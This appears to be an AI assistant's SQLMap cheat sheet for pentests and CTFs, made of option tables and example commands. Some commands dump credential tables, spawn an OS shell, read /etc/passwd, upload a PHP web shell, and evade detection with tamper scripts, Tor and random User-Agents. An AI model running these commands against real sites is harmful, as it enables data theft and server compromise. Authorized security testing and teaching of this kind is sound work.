Here's a **comprehensive SQLMap Cheat Sheet** 🐍, organized by function, with real-world usage examples to help you work faster during pentests or CTFs.

---

## 🔧 Basic Syntax

```bash
sqlmap -u <URL> [options]
```

Example:

```bash
sqlmap -u "http://example.com/page.php?id=1"
```

---

## 🔍 Detection & Scanning

|Option|Description|Example|
|---|---|---|
|`--batch`|Run without asking for user input|`--batch`|
|`--level=1-5`|Risk level of tests (default 1)|`--level=5`|
|`--risk=1-3`|Risk of payloads (default 1)|`--risk=3`|
|`--random-agent`|Use random User-Agent|`--random-agent`|
|`--tor --tor-type=SOCKS5`|Route traffic through Tor|`--tor --tor-type=SOCKS5`|
|`--threads=N`|Number of concurrent HTTP requests|`--threads=10`|

---

## 🧪 Enumeration

|Option|Description|Example|
|---|---|---|
|`--dbs`|List available databases|`sqlmap -u ... --dbs`|
|`--tables -D db`|List tables in a database|`--tables -D testdb`|
|`--columns -T tb`|List columns in a table|`--columns -T users -D testdb`|
|`--dump`|Dump table data|`--dump -T users -D testdb`|
|`--dump-all`|Dump everything|`--dump-all`|

---

## 🔑 Authentication & Sessions

|Option|Description|Example|
|---|---|---|
|`--cookie="..."`|Send cookies|`--cookie="PHPSESSID=12345"`|
|`--auth-type`|HTTP auth type (Basic, Digest)|`--auth-type=Basic`|
|`--auth-cred`|HTTP username:password|`--auth-cred=admin:admin123`|
|`--csrf-token`|Handle CSRF token|`--csrf-token="token"`|
|`--headers`|Custom HTTP headers|`--headers="X-API-Key: ABC123"`|

---

## 🕵️‍♂️ Advanced Techniques

|Option|Description|Example|
|---|---|---|
|`--technique=BEUSTQ`|SQLi techniques (Boolean, Union, etc)|`--technique=BEU`|
|`--time-sec=N`|Seconds for time-based blind|`--time-sec=5`|
|`--union-cols=N`|Guess union columns|`--union-cols=5`|
|`--second-url`|Load a second URL (multi-step login)|`--second-url="http://site.com/step2"`|
|`--os-shell`|Spawn an OS shell (if injectable)|`--os-shell`|
|`--file-read=/etc/passwd`|Read a file from server|`--file-read=/etc/passwd`|
|`--file-write` + `--file-dest`|Upload file to server|`--file-write=shell.php --file-dest=/var/www/html/shell.php`|

---

## 💥 Bypasses & Obfuscation

|Option|Description|Example|
|---|---|---|
|`--tamper=space2comment`|Obfuscate payloads|`--tamper=space2comment,between`|
|`--prefix/--suffix`|Add custom prefix/suffix to payloads|`--prefix="')-- "`|
|`--delay=N`|Wait N seconds between requests|`--delay=2`|
|`--hex`|Encode payload in HEX|`--hex`|

---

## 💾 Output and Logging

|Option|Description|Example|
|---|---|---|
|`-o`|Store output|`-o`|
|`--output-dir=DIR`|Custom output directory|`--output-dir=./logs/sqlmap/`|

---

## 📦 Useful Usage Examples

### Enumerate databases:

```bash
sqlmap -u "http://target.com/page.php?id=1" --dbs
```

### Dump user credentials:

```bash
sqlmap -u "http://target.com/page.php?id=1" -D usersdb -T accounts --dump
```

### Get OS shell (if possible):

```bash
sqlmap -u "http://target.com/vuln.php?id=1" --os-shell
```

### Use Tor + Random User-Agent:

```bash
sqlmap -u "http://target.com/page.php?id=1" --tor --tor-type=SOCKS5 --random-agent --batch
```

---

Would you like this exported as a PDF or Markdown file for offline use? 